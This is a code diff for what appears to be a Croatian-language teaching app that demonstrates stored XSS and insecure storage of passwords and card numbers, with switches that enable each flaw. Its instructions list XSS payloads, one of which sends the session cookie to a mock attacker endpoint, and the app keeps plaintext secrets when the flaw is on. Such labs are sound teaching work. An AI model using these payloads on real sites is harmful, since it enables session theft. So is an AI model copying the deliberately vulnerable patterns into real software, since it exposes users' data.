@@ -3,6 +3,7 @@ import cookieParser from "cookie-parser";
 import crypto from "crypto";
 import { layout, toggle, escapeHtml, Settings } from "./views";
 import { comments, stolen, renderComments } from "./xss";
+import { register, login, renderDatabase } from "./sde";
 
 const app = express();
 const port = Number(process.env.PORT) || 3000;
@@ -35,14 +36,14 @@ app.get("/", (req, res) => {
     res.send(layout(`
 <hr>
 <h2>Cross-site scripting (XSS) – pohranjeni</h2>
-<p><b>Upute:</b> Komentar se sprema na poslužitelj i prikazuje svima.
-Kad je ranjivost uključena, upisati jedan od komentara:</p>
+<p><b>Upute:</b> Komentar se sprema na poslužitelj i prikazuje svim posjetiteljima.
+Kad je ranjivost uključena, upišite jedan od sljedećih komentara:</p>
 <ul>
-<li>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</li>
-<li>&lt;img src=x onerror="alert(document.cookie)"&gt;</li>
-<li>&lt;script&gt;new Image().src='/steal?c='+encodeURIComponent(document.cookie)&lt;/script&gt;</li>
+<li><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></li>
+<li><code>&lt;img src=x onerror="alert(document.cookie)"&gt;</code></li>
+<li><code>&lt;script&gt;new Image().src='/steal?c='+encodeURIComponent(document.cookie)&lt;/script&gt;</code></li>
 </ul>
-<p>Prva dva prikazuju cookie sjednice u alert prozoru, a treći ga šalje „napadaču” (link ispod).
+<p>Prva dva prikazuju kolačić sjednice u alert prozoru, a treći ga šalje „napadaču” (vidi poveznicu ispod).
 Kad je ranjivost isključena, isti komentari prikazuju se kao običan tekst.</p>
 ${toggle("xss", s.xss)}
 <form method="post" action="/xss/comment">
@@ -52,13 +53,51 @@ Komentar: <input name="text" size="60">
 <form method="post" action="/xss/clear">
 <button type="submit">Obriši sve komentare</button>
 </form>
-<p><a href="/napadac">Poslužitelj napadača – ukradeni cookies</a></p>
+<p><a href="/napadac">Napadačev poslužitelj – ukradeni kolačići</a></p>
 <h3>Komentari</h3>
 ${renderComments(s.xss)}
 <hr>
 <h2>Nesigurna pohrana osjetljivih podataka (Sensitive Data Exposure)</h2>
+<p><b>Upute:</b> Registrirajte korisnika s lozinkom i brojem kartice ili se prijavite kao
+<code>ana</code> / <code>ana123</code> ili <code>marko</code> / <code>lozinka</code>.
+Ispod forme prikazan je sadržaj baze, odnosno ono što napadač vidi ako ukrade bazu ili njezinu sigurnosnu kopiju.
+Kad je ranjivost uključena, lozinke i brojevi kartica pohranjuju se i prikazuju kao čisti tekst.
+Kad je isključena, lozinke se pohranjuju kao scrypt hash sa solju, brojevi kartica šifrirani su algoritmom AES-256-GCM,
+a nakon prijave prikazuje se samo maskirani broj kartice.
+Svaki način rada ima vlastitu bazu.</p>
 ${toggle("sde", s.sde)}
+${typeof req.query.sdeMsg === "string" ? `<p><b>${escapeHtml(req.query.sdeMsg)}</b></p>` : ""}
+<form method="post" action="/sde/register">
+Korisničko ime: <input name="username">
+Lozinka: <input name="password" type="password">
+Broj kartice: <input name="card">
+<button type="submit">Registriraj</button>
+</form>
+<form method="post" action="/sde/login">
+Korisničko ime: <input name="username">
+Lozinka: <input name="password" type="password">
+<button type="submit">Prijavi se</button>
+</form>
+<h3>Sadržaj baze podataka</h3>
+${renderDatabase(s.sde)}
 `));
+});
+
+app.post("/sde/register", (req, res) => {
+    const s = readSettings(req);
+    const msg = register(
+        s.sde,
+        String(req.body?.username ?? "").trim(),
+        String(req.body?.password ?? ""),
+        String(req.body?.card ?? ""),
+    );
+    res.redirect("/?sdeMsg=" + encodeURIComponent(msg));
+});
+
+app.post("/sde/login", (req, res) => {
+    const s = readSettings(req);
+    const msg = login(s.sde, String(req.body?.username ?? "").trim(), String(req.body?.password ?? ""));
+    res.redirect("/?sdeMsg=" + encodeURIComponent(msg));
 });
 
 app.post("/settings/:name", (req, res) => {
@@ -93,8 +132,8 @@ app.get("/napadac", (_req, res) => {
         .map((s) => `<li>${s.time}: <code>${escapeHtml(s.data)}</code></li>`)
         .join("\n");
     res.send(layout(`
-<h2>Poslužitelj napadača</h2>
-<p>Cookies koje je napadačeva skripta poslala:</p>
+<h2>Napadačev poslužitelj</h2>
+<p>Kolačići koje je napadačeva skripta poslala:</p>
 ${stolen.length ? `<ul>\n${rows}\n</ul>` : "<p>Još ništa nije ukradeno.</p>"}
 <p><a href="/">Natrag</a></p>
 `));
